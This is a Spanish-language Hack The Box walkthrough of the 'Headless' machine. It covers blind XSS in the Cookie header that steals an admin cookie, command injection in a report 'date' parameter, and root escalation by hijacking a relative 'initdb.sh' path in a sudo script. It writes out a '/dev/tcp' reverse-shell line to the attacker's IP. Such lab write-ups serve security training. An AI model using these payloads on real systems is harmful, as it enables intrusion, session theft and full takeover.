---
layout: default
title: Headless
---
#HEADLESS HTB
## ENUMERACIÓN
Primero comprobamos que hay conexión con el equipo.
```bash
$ ping -c 1 10.129.193.81
PING 10.129.193.81 (10.129.193.81) 56(84) bytes of data.
64 bytes from 10.129.193.81: icmp_seq=1 ttl=63 time=7.58 ms

--- 10.129.193.81 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.583/7.583/7.583/0.000 ms
```
Escaneamos a ver si tiene algún puerto abierto:
```bash
$ nmap 10.129.193.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 14:41 CDT
Nmap scan report for 10.129.193.81
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```
Vemos que tiene los puertos 22 y 5000 abiertos, vamos a escanearlos más a fondo:
```bash
$ nmap -sCV -p22,5000 10.129.193.81 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 14:45 CDT
Nmap scan report for 10.129.193.81
Host is up (0.0076s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 31 May 2025 19:45:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
<<SNIP>>
```
Vemos que tiene una versión a priori no vulnerable de ssh y en el puerto 5000 corriendo un servidor web de Werkzeug. Podemos deducirlo por las cabeceras HTTP y por el código html que se ve abajo.
![headless]({{ "/assets/images/headless1.png"}})

Nos encontramos esto al meternos a la página web, tenemos un botón `For questions` que si le damos nos redirige a un formulario de contacto en `http://10.129.193.81:5000/support`:

![headless]({{ "/assets/images/headless2.png"}})

## EXPLOTACIÓN

Podemos intentar una XSS, probaremos en el cuerpo de mensajes:

![headless]({{ "/assets/images/headless3.png"}})

![headless]({{ "/assets/images/headless4.png"}})

No nos sale la alerta que queríamos pero nos muestra que han detectado un ataque y que se enviarán estos datos (las cabeceras de la petición HTTP que realizamos) a los investigadores, lo que huele a ser una XSS ciega, tenemos control de todas las cabeceras, asi que capturaremos la petición con burpsuite.

![headless]({{ "/assets/images/headless5.png"}})

Una vez en BurpSuite, con la petición, vamos a probar a inyectar código JavaScript en las Cookies:

![headless]({{ "/assets/images/headless7.png"}})

Esto debería de darnos una alerta en el navegador que diga PWNED si las cookies son vulnerables a XSS.

![headless]({{ "/assets/images/headless9.png"}})

En efecto, es vulnerable a XSS.

![headless]({{ "/assets/images/headless10.png"}})

Podemos ver como en las cookies la `ShadowRooted_XSS` no se muestra, ya que es el código JavaScript, si le damos a inspeccionar podemos ver que pasa en esa parte:

![headless]({{ "/assets/images/headless11.png"}})

Bien, sabiendo que es vulnerable y que la cookie se guarda como `is_admin` nos abriremos un puerto web con Python y usaremos un payload que nos envíe la cookie del administrador.

```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Ahora, capturamos la petición de nuevo y añadimos en la cabecera de las cookies un payload que nos envíe la cookie del administrador que verá esta página.

![headless]({{ "/assets/images/headless13.png"}})

A la espera de unos segundos recibimos la cookie:

```bash
10.129.193.81 - - [31/May/2025 15:09:47] "GET /admin_cookie?=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
```
Aparte de esa petición con la cookie nos hace otras 3, las cuales le da error 404, esto se debe a que el `document.location` le redirige a nuestra página y va a intentar buscar el archivo index, no obstante no existe, lo suyo sería usar otro método que haga menos ruido.

Una vez tenemos la cookie del administrador, investigaremos sobre directorios en la web con ffuf:
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.129.193.81:5000/FUZZ -ic

support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 43ms]
dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 41ms]
```
Encontramos el directorio `dashboard`, con código 500, vamos a intentar acceder:

![headless]({{ "/assets/images/headless15.png"}})

Recibimos que el servidor no pudo verificar si estamos autorizados para acceder al recurso. Bien, en las dev tools, en almacenamiento y en cookie, sustituimos la de `is_admin` por la obtenida del administrador y recargamos:

![headless]({{ "/assets/images/headless16.png"}})

Una vez recargamos podemos acceder y vemos una opción para generar reportes de la página el cual pongamos la fecha que pongamos siempre nos devuelve `Systems are up and running!`:

![headless]({{ "/assets/images/headless18.png"}})

Capturamos la petición con Burpsuite y la enviamos al repeater:

![headless]({{ "/assets/images/headless19.png"}})

Vemos que envía el parámetro `date` el cual pongas lo que pongas, sea una fecha válida o no sea ni una fecha, nos dice lo mismo. Aquí podríamos probar una inyección de comandos en el parámetro `date`, lo probamos con un `|` para así en caso de existir la vulnerabilidad que nos muestre únicamente la salida de nuestro comando.

![headless]({{ "/assets/images/headless20.png"}})

![headless]({{ "/assets/images/headless21.png"}})

Vemos que la respuesta del servidor es el nombre del usuario que ejecuta el servidor web, por lo que sí, hay una vulnerabilidad que nos permite inyectar comandos, bien, nos pondremos a escucha en el puerto 4444 con `nc` y nos enviaremos una reverse shell:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```
Con el siguiente payload deberíamos recibir una reverse shell:

![headless]({{ "/assets/images/headless24.png"}})

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.115] from (UNKNOWN) [10.129.193.81] 49456
bash: cannot set terminal process group (1147): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ whoami
whoami
dvir
dvir@headless:~/app$ 

```
Efectivamente tenemos la reverse shell, vamos a hacerla más interactiva con los siguientes comandos:

```bash
$ stty raw -echo;fg
```

(Este se ejecuta en la máquina atacante, tenemos que poner en segundo plano la revershe shell con `ctrl+z`).

```bash
dvir@headless:~/app$ export TERM=xterm
```

```bash
dvir@headless:~/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Y ya tendríamos una shell interactiva.

En nuestro HOME tendríamos la flag de usuario:
```bash
dvir@headless:~$ ls
app  geckodriver.log  user.txt
dvir@headless:~$ cat user.txt
```
Si verificamos los permisos de sudo que tenemos vemos que podemos ejecutar como sudo y sin contraseña el script `syscheck` que se encuentra en `/usr/bin/`:

```bash
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
Vamos a leer el contenido del script:

```bash
dvir@headless:~$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```
Vemos que al final del script, ejecuta usando una ruta relativa el script `initdb.sh`. Al usar una ruta relativa, se ejecuta el script con ese nombre encontrado en el directorio en el que estemos nosotros. Por lo que podemos aprovechar para crear un script que nos proporcione una reverse shell como sudo:

```bash
dvir@headless:~$ cd /tmp/
dvir@headless:/tmp$ cat initdb.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.115/4444 0>&1

dvir@headless:/tmp$ chmod +x initdb.sh
```
Una vez creado el script y haberle dado permisos de ejecución, si ejecutamos el script `syscheck` con permisos sudo, obtendríamos una reverse shell como usuario root, no sin antes haber puesto a escucha el puerto 4444 en nuestra máquina atacante.

```bash
dvir@headless:/tmp$ sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.07, 0.03, 0.02
Database service is not running. Starting it...
```
Y recibimos la reverse shell como root:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.115] from (UNKNOWN) [10.129.193.81] 56312
root@headless:/tmp# whoami
whoami
root

```
En `/root/` tenemos root flag:

```bash
root@headless:~# ls
root.txt
```
